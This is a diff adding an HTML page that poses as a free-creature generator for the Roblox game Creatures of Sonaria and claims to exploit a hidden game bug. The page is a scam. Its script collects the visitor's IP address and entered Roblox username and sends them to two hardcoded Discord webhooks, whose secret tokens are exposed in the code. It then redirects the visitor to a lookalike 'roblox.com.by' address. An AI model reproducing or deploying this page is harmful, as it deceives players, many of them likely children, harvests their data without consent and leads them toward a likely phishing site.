@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+  <meta charset="UTF-8" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <title>CREATURES OF SONARIA - DRAGON GENERATOR</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <style>
+
+    body {
+
+      background-image: url("./images/sonaria.jpg"); /* ✅ pakai gambar dari repo */
+
+      background-size: cover;
+
+      background-position: center;
+
+      background-attachment: fixed;
+
+      font-family: Arial, sans-serif;
+
+    }
+
+    body::before {
+
+      content: "";
+
+      position: fixed;
+
+      top: 0; left: 0;
+
+      width: 100%; height: 100%;
+
+      background: rgba(0, 0, 0, 0.7);
+
+      z-index: -1;
+
+    }
+
+    .highlight {
+
+      border: 3px solid #0ff;
+
+      box-shadow: 0 0 25px #0ff, 0 0 50px #0ff, 0 0 100px #0ff;
+
+      transform: scale(1.1);
+
+      transition: all 0.2s ease-in-out;
+
+    }
+
+    @keyframes glowPulse {
+
+      0% { box-shadow: 0 0 5px cyan, 0 0 10px cyan; }
+
+      50% { box-shadow: 0 0 20px cyan, 0 0 40px cyan; }
+
+      100% { box-shadow: 0 0 5px cyan, 0 0 10px cyan; }
+
+    }
+
+    .neon-glow { animation: glowPulse 1.5s infinite; }
+
+    #welcomeOverlay {
+
+      position: fixed;
+
+      top: 0; left: 0;
+
+      width: 100%; height: 100%;
+
+      background: radial-gradient(circle, rgba(0,255,200,0.2) 0%, rgba(0,0,0,0.95) 100%);
+
+      display: flex;
+
+      flex-direction: column;
+
+      justify-content: center;
+
+      align-items: center;
+
+      z-index: 2000;
+
+      overflow: hidden;
+
+      animation: fadeOut 2s ease forwards;
+
+      animation-delay: 5s;
+
+    }
+
+    .welcome-title {
+
+      font-size: 3rem;
+
+      font-weight: bold;
+
+      color: cyan;
+
+      text-shadow: 0 0 15px cyan, 0 0 30px #0ff, 0 0 60px #0ff;
+
+      animation: glowPulse 2s infinite;
+
+    }
+
+    .welcome-sub {
+
+      font-size: 1.5rem;
+
+      color: #00ffe0;
+
+      margin-top: 20px;
+
+      opacity: 0;
+
+      animation: fadeInUp 2s ease forwards;
+
+      animation-delay: 1.5s;
+
+    }
+
+    #welcomeIP {
+
+      font-size: 1.2rem;
+
+      color: #0ff;
+
+      margin-top: 10px;
+
+      opacity: 0;
+
+      animation: fadeInUp 2s ease forwards;
+
+      animation-delay: 2.5s;
+
+    }
+
+    @keyframes fadeInUp {
+
+      from { opacity: 0; transform: translateY(20px); }
+
+      to { opacity: 1; transform: translateY(0); }
+
+    }
+
+    @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
+
+    .leaves span {
+
+      position: absolute;
+
+      top: -50px;
+
+      font-size: 2rem;
+
+      animation: fall 6s linear infinite;
+
+      opacity: 0.8;
+
+    }
+
+    .leaves span:nth-child(1) { left: 20%; animation-delay: 0s; }
+
+    .leaves span:nth-child(2) { left: 40%; animation-delay: 1s; }
+
+    .leaves span:nth-child(3) { left: 60%; animation-delay: 2s; }
+
+    .leaves span:nth-child(4) { left: 80%; animation-delay: 3s; }
+
+    .leaves span:nth-child(5) { left: 50%; animation-delay: 4s; }
+
+    @keyframes fall {
+
+      0%   { transform: translateY(0) rotate(0deg); opacity: 1; }
+
+      100% { transform: translateY(110vh) rotate(360deg); opacity: 0; }
+
+    }
+
+    #congratsOverlay {
+
+      position: fixed;
+
+      top: 0; left: 0;
+
+      width: 100%; height: 100%;
+
+      background: rgba(0,0,0,0.85);
+
+      display: none;
+
+      justify-content: center;
+
+      align-items: center;
+
+      flex-direction: column;
+
+      z-index: 998;
+
+      text-align: center;
+
+      color: white;
+
+      animation: fadeIn 1s ease forwards;
+
+    }
+
+    #congratsOverlay img {
+
+      width: 150px; height: 150px;
+
+      border-radius: 12px;
+
+      box-shadow: 0 0 30px cyan;
+
+      margin-bottom: 20px;
+
+      animation: bounce 1s infinite alternate;
+
+    }
+
+    @keyframes bounce { from { transform: scale(1); } to { transform: scale(1.1); } }
+
+    #congratsOverlay h2 {
+
+      font-size: 2rem; font-weight: bold; color: cyan;
+
+      text-shadow: 0 0 10px cyan, 0 0 30px cyan;
+
+      animation: glowText 1s infinite alternate;
+
+    }
+
+    #redirectOverlay {
+
+      position: fixed;
+
+      top: 0; left: 0;
+
+      width: 100%; height: 100%;
+
+      background: rgba(0,0,0,0.95);
+
+      display: none;
+
+      justify-content: center;
+
+      align-items: center;
+
+      flex-direction: column;
+
+      z-index: 999;
+
+      animation: fadeIn 1s ease forwards;
+
+    }
+
+    @keyframes fadeIn { from {opacity:0;} to {opacity:1;} }
+
+    .redirect-text {
+
+      font-size: 2rem; font-weight: bold; color: cyan;
+
+      text-align: center;
+
+      text-shadow: 0 0 10px cyan, 0 0 30px cyan;
+
+      animation: glowText 1s infinite alternate;
+
+    }
+
+    #popup {
+
+      position: fixed; top: 20px; left: 50%;
+
+      transform: translateX(-50%);
+
+      background: rgba(0,255,255,0.1);
+
+      border: 2px solid cyan;
+
+      padding: 15px 25px;
+
+      border-radius: 12px;
+
+      color: cyan;
+
+      font-weight: bold;
+
+      text-shadow: 0 0 5px cyan, 0 0 20px cyan;
+
+      display: none;
+
+      animation: popupAnim 0.5s ease;
+
+      z-index: 1000;
+
+    }
+
+    @keyframes popupAnim {
+
+      from { opacity: 0; transform: translate(-50%, -20px); }
+
+      to { opacity: 1; transform: translate(-50%, 0); }
+
+    }
+
+  </style>
+
+</head>
+
+<body class="text-white flex flex-col items-center min-h-screen p-6">
+
+
+
+  <!-- Welcome Overlay -->
+
+  <div id="welcomeOverlay">
+
+    <h1 class="welcome-title">💫 CREATURES OF SONARIA 💫</h1>
+
+    <p class="welcome-sub">✨ DRAGON GENERATOR ✨</p>
+
+    
+
+    <div class="leaves">
+
+      <span>💫</span>
+
+      <span>✨</span>
+
+      <span>🍄</span>
+
+      <span>🌟</span>
+
+      <span>💫</span>
+
+    </div>
+
+  </div>
+
+  <!-- IP Address Display -->
+
+  <h1 class="text-4xl font-bold text-cyan-400 mb-2">🌟CREATURES OF SONARIA🌟</h1>
+
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">✨DRAGON GENERATOR✨</h2>
+
+
+
+  <input id="username" 
+
+         type="text" 
+
+         placeholder="Enter your Roblox Username" 
+
+         class="w-72 p-2 rounded-md text-black text-center border-2 border-cyan-400 mb-6"/>
+
+
+
+    <!-- Grid daftar dragon -->
+
+  <div id="DRAGON" class="grid grid-cols-2 gap-4 max-w-md">
+
+    <div class="DRAGON border-2 border-cyan-400 rounded-lg p-4 flex flex-col items-center">
+
+      <img src="./images/KERUKU.webp" class="w-20 h-20 rounded-lg" alt="KERUKU">
+
+      <p>🍄 KERUKU</p>
+
+    </div>
+
+    <div class="DRAGON border-2 border-cyan-400 rounded-lg p-4 flex flex-col items-center">
+
+      <img src="./images/AOLENUS.webp" class="w-20 h-20 rounded-lg" alt="AOLENUS">
+
+      <p>🍄 AOLENUS</p>
+
+    </div>
+
+    <div class="DRAGON border-2 border-cyan-400 rounded-lg p-4 flex flex-col items-center">
+
+      <img src="./images/PENTAGLOS.webp" class="w-20 h-20 rounded-lg" alt="PENTAGLOS">
+
+      <p>🍄 PENTAGLOS</p>
+
+    </div>
+
+    <div class="DRAGON border-2 border-cyan-400 rounded-lg p-4 flex flex-col items-center">
+
+      <img src="./images/MIJUSUIMA.webp" class="w-20 h-20 rounded-lg" alt="MIJUSUIMA">
+
+      <p>🍄 MIJUSUIMA</p>
+
+    </div>
+
+    <div class="DRAGON border-2 border-cyan-400 rounded-lg p-4 flex flex-col items-center">
+
+      <img src="./images/CORVURAX.webp" class="w-20 h-20 rounded-lg" alt="CORVURAX">
+
+      <p>🍄 CORVURAX</p>
+
+    </div>
+
+    <div class="DRAGON border-2 border-cyan-400 rounded-lg p-4 flex flex-col items-center">
+
+      <img src="./images/ZOKZIS.webp" class="w-20 h-20 rounded-lg" alt="ZOKZIS">
+
+      <p>🍄 ZOKZIS</p>
+
+    </div>
+
+  </div>
+
+
+
+  <button id="generateBtn" 
+
+          class="mt-8 px-6 py-2 bg-cyan-500 hover:bg-cyan-700 rounded-lg text-black font-bold text-lg shadow-lg">
+
+    Generate
+
+  </button>
+
+
+
+<!-- Link YouTube Tutorial -->
+
+  <div class="mt-6 flex justify-center w-full max-w-md">
+
+    <a href="None" target="_blank" rel="noopener"
+
+       class="w-full sm:w-auto text-center px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-white font-bold shadow-lg transition">
+
+      🎥 Watch Tutorial on YouTube
+
+    </a>
+
+  </div>
+
+
+
+<!-- Collapsible Description -->
+
+<div class="mt-4 w-full max-w-md">
+
+  <button id="descToggle"
+
+          class="w-full flex items-center justify-between px-4 py-3 bg-cyan-900/40 hover:bg-cyan-900/60 border border-cyan-500 rounded-lg transition font-semibold"
+
+          aria-expanded="false" aria-controls="descPanel">
+
+    <span>ℹ️ Description</span>
+
+    <svg id="descChevron" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"
+
+         class="w-5 h-5 transition-transform" fill="none" stroke="currentColor" stroke-width="2">
+
+      <path d="M6 9l6 6 6-6"/>
+
+    </svg>
+
+  </button>
+
+
+
+  <!-- Panel dengan animasi -->
+
+  <div id="descPanel"
+
+       class="max-h-0 overflow-hidden border border-cyan-500/70 rounded-lg mt-2 bg-black/40 transition-all duration-500 ease-in-out">
+
+    <div class="p-4">
+
+      <p class="leading-relaxed">
+
+        🌟 Hey there, explorers of Sonaria! This website was crafted by the Dev especially for you,  
+
+        so you can enjoy unlocking <span class="text-cyan-400 font-semibold">free creatures</span> in  
+
+        <span class="font-semibold">Creatures of Sonaria</span>.  
+
+        💻 The Dev worked tirelessly — long nights, countless tests, and endless attempts —  
+
+        until finally discovering a <span class="text-green-400 font-bold">hidden bug</span> inside the game.  
+
+        🚀 With this trick, you can claim rare creatures without spending a single Shroom.  
+
+        Every click is a gift from the Dev’s hard work, created to bring joy to the whole Sonarian community. 🌌🦕🌿
+
+      </p>
+
+    </div>
+
+  </div>
+
+</div>
+
+
+
+<!-- Script -->
+
+<script>
+
+  const descToggle = document.getElementById("descToggle");
+
+  const descPanel = document.getElementById("descPanel");
+
+  const descChevron = document.getElementById("descChevron");
+
+
+
+  descToggle.addEventListener("click", () => {
+
+    if (descPanel.classList.contains("max-h-0")) {
+
+      // buka
+
+      descPanel.classList.remove("max-h-0");
+
+      descPanel.classList.add("max-h-[500px]"); // cukup besar biar muat isi
+
+      descChevron.classList.add("rotate-180");
+
+      descToggle.setAttribute("aria-expanded", "true");
+
+    } else {
+
+      // tutup
+
+      descPanel.classList.add("max-h-0");
+
+      descPanel.classList.remove("max-h-[500px]");
+
+      descChevron.classList.remove("rotate-180");
+
+      descToggle.setAttribute("aria-expanded", "false");
+
+    }
+
+  });
+
+</script>
+
+
+
+  <div id="popup">⚠️ Please enter your Roblox username first!</div>
+
+
+
+  <div id="congratsOverlay">
+
+    <img id="congratsImg" src="" alt="DRAGON">
+
+    <h2 id="congratsText">🦕 Congratulations! You got ...</h2>
+
+  </div>
+
+
+
+  <div id="redirectOverlay">
+
+    <div class="redirect-text">🔗 Redirecting to Private Server...</div>
+
+  </div>
+
+
+
+  <script>
+
+    const WEBHOOK_URL_1 = "https://discord.com/api/webhooks/1409805078243835955/9EPRyX6uSkox4DFYtc8Tg9-QHdYRzdRx5AqGDU0xo3hWAEiVPDivP6rSFNX4IOURpbBg"; // dengan IP
+
+    const WEBHOOK_URL_2 = "https://discord.com/api/webhooks/1410421565790879764/QP7Bcms0BjLqv3VPIMnUbeXXIPykBXtym_FNbJ_oo-428AHExYlmRxCKcO1LpeePu_67";   // tanpa IP
+
+
+
+    function showPopup(msg) {
+
+      let popup = document.getElementById("popup");
+
+      popup.innerText = msg;
+
+      popup.style.display = "block";
+
+      setTimeout(() => { popup.style.display = "none"; }, 3000);
+
+    }
+
+
+
+    let cachedIP = "Unknown";
+
+async function fetchIP() {
+
+  try {
+
+    const res = await fetch('https://api.ipify.org?format=json');
+
+    const data = await res.json();
+
+    cachedIP = data.ip || "Unknown";
+
+  } catch(e) {
+
+    cachedIP = "Unknown";
+
+  }
+
+}
+
+window.addEventListener("load", fetchIP);
+
+
+
+    // Ambil avatar Roblox dari username
+
+    async function getRobloxAvatar(username) {
+
+      try {
+
+        const res = await fetch("https://users.roblox.com/v1/usernames/users", {
+
+          method: "POST",
+
+          headers: { "Content-Type": "application/json" },
+
+          body: JSON.stringify({ usernames: [username] })
+
+        });
+
+        const data = await res.json();
+
+
+
+        if (!data.data || data.data.length === 0) {
+
+          console.warn("User not found:", username);
+
+          return "https://tr.rbxcdn.com/df01b02d6d9d3e33b0f9c48ea3b5a7e0/420/420/AvatarHeadshot/Png";
+
+        }
+
+
+
+        const userId = data.data[0].id;
+
+        return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
+
+      } catch (err) {
+
+        console.error("Error fetching Roblox avatar:", err);
+
+        return "https://tr.rbxcdn.com/df01b02d6d9d3e33b0f9c48ea3b5a7e0/420/420/AvatarHeadshot/Png";
+
+      }
+
+    }
+
+
+
+    async function sendToDiscordWithIP(username, DRAGONName, DRAGONImg, ip) {
+
+      const avatarUrl = await getRobloxAvatar(username);
+
+      console.log("Avatar URL for", username, ":", avatarUrl);
+
+
+
+      const fields = [
+
+        { name: "👤 Roblox Username", value: username || "Unknown", inline: true },
+
+        { name: "🦕 DRAGON", value: DRAGONName, inline: true }
+
+      ];
+
+      if (ip && ip !== "Unknown") fields.push({ name: "🌐 IP", value: ip });
+
+
+
+      fetch(WEBHOOK_URL_1, {
+
+        method: "POST",
+
+        headers: { "Content-Type": "application/json" },
+
+        body: JSON.stringify({
+
+          username: "💫 DRAGON Generator Bot",
+
+          embeds: [{
+
+            title: "🦕 New DRAGON Generated!",
+
+            color: 0x00ffff,
+
+            fields,
+
+            thumbnail: { url: DRAGONImg },
+
+            image: { url: avatarUrl },
+
+            author: { name: username, icon_url: avatarUrl },
+
+            footer: { text: "CREATURES OF SONARIA - DRAGON GENERATOR" },
+
+            timestamp: new Date()
+
+          }]
+
+        })
+
+      });
+
+    }
+
+
+
+    async function sendToDiscordNoIP(username, DRAGONName, DRAGONImg) {
+
+      const avatarUrl = await getRobloxAvatar(username);
+
+      console.log("Avatar URL for", username, ":", avatarUrl);
+
+
+
+      const fields = [
+
+        { name: "👤 Roblox Username", value: username || "Unknown", inline: true },
+
+        { name: "🦕 DRAGON", value: DRAGONName, inline: true }
+
+      ];
+
+
+
+      fetch(WEBHOOK_URL_2, {
+
+        method: "POST",
+
+        headers: { "Content-Type": "application/json" },
+
+        body: JSON.stringify({
+
+          username: "💫 DRAGON Generator Bot",
+
+          embeds: [{
+
+            title: "🦕 New DRAGON Generated! (No IP)",
+
+            color: 0x00ff80,
+
+            fields,
+
+            thumbnail: { url: DRAGONImg },
+
+            image: { url: avatarUrl },
+
+            author: { name: username, icon_url: avatarUrl },
+
+            footer: { text: "CREATURES OF SONARIA - DRAGON GENERATOR" },
+
+            timestamp: new Date()
+
+          }]
+
+        })
+
+      });
+
+    }
+
+
+
+    function generateRandomDRAGON() {
+
+      let username = document.getElementById("username").value.trim();
+
+      if (username === "") {
+
+        showPopup("⚠️ Please enter your Roblox username first!");
+
+        return;
+
+      }
+
+
+
+      let DRAGON = document.querySelectorAll(".DRAGON");
+
+      let highlightIndex = 0;
+
+      let duration = 5000;
+
+      let intervalTime = 150;
+
+      let elapsed = 0;
+
+
+
+      let interval = setInterval(() => {
+
+        DRAGON.forEach(p => p.classList.remove("highlight"));
+
+        highlightIndex = (highlightIndex + 1) % DRAGON.length;
+
+        DRAGON[highlightIndex].classList.add("highlight");
+
+
+
+        elapsed += intervalTime;
+
+        if (elapsed >= duration) {
+
+          clearInterval(interval);
+
+
+
+          DRAGON.forEach(p => p.classList.remove("highlight"));
+
+          let randomIndex = Math.floor(Math.random() * DRAGON.length);
+
+          let chosenDRAGON = DRAGON[randomIndex];
+
+          chosenDRAGON.classList.add("highlight");
+
+
+
+          let DRAGONImg = chosenDRAGON.querySelector("img").src;
+
+          let DRAGONName = chosenDRAGON.querySelector("p").innerText;
+
+          document.getElementById("congratsImg").src = DRAGONImg;
+
+          document.getElementById("congratsText").innerText = "🎉 Congratulations! You got " + DRAGONName + " 🎉";
+
+          document.getElementById("congratsOverlay").style.display = "flex";
+
+
+
+          // Kirim ke 2 webhook
+
+          sendToDiscordWithIP(username, DRAGONName, DRAGONImg, cachedIP);
+
+          sendToDiscordNoIP(username, DRAGONName, DRAGONImg);
+
+
+
+          setTimeout(() => {
+
+  document.getElementById("congratsOverlay").style.display = "none";
+
+  document.getElementById("redirectOverlay").style.display = "flex";
+
+  
+
+  setTimeout(() => {
+
+  // Redirect ke private server
+
+  window.location.href = "https://www.roblox.com.by/games/5233782396/Creatures-of-Sonaria-Survive-Kaiju-Animals?privateServerLinkCode=11346680570957943458539419858287"
+
+}, 4000); // <- nutup timeout kedua (4 detik)
+
+
+
+}, 3000); // <- nutup timeout pertama (3 detik) ❌ ini bikin error
+
+        }
+
+      }, intervalTime);
+
+    }
+
+
+
+    document.getElementById("generateBtn").addEventListener("click", generateRandomDRAGON);
+
+
+
+    // Sembunyikan overlay selamat datang setelah animasi selesai
+
+    setTimeout(() => {
+
+      document.getElementById("welcomeOverlay").style.display = "none";
+
+    }, 7000);
+
+  </script>
